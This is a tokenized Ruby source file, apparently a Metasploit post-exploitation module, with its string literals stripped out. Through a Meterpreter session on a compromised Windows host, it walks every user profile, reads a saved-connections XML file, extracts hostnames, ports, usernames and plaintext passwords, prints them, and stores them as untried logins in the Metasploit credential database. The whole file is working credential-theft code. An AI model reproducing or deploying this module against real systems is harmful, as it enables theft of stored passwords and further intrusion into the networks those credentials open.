require <str> require <str> require <str> class Metasploit3 < Msf :: Post include Msf :: Post :: Windows :: UserProfiles def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ <str> ] , <str> = > [ <str> ] ) ) end def run grab_user_profiles ( ) . each do | user | next if user [ <str> ] . nil? xml = get_xml ( user [ <str> ] + <str> ) unless xml . nil? parse_xml ( xml ) end end end def get_xml ( path ) begin connections = client . fs . file . new ( path , <str> ) condata = <str> until connections . eof condata << connections . read end return condata rescue Rex :: Post :: Meterpreter :: RequestError = > e print_error <str> path <str> e . message <str> return nil end end def parse_xml ( data ) mxml = REXML :: Document . new ( data ) . root mxml . elements . to_a ( <str> ) . each . each do | node | next if node . elements [ <str> ] . nil? next if node . elements [ <str> ] . nil? next if node . elements [ <str> ] . nil? host = node . elements [ <str> ] . text port = node . elements [ <str> ] . text user = node . elements [ <str> ] . text pass = node . elements [ <str> ] . text next if ! pass or pass . empty? print_good ( <str> session . sock . peerhost <str> port <str> host <str> user <str> pass <str> ) service_data = { <str> : Rex :: Socket . getaddress ( host ) , <str> : port , <str> : <str> , <str> : <str> , <str> : myworkspace_id } credential_data = { <str> : <str> , <str> : session_db_id , <str> : self . refname , <str> : user , <str> : pass , <str> : <str> } credential_core = create_credential ( credential_data . merge ( service_data ) ) login_data = { <str> : credential_core , <str> : <str> , <str> : Metasploit :: Model :: Login :: Status :: UNTRIED } create_credential_login ( login_data . merge ( service_data ) ) end end end 
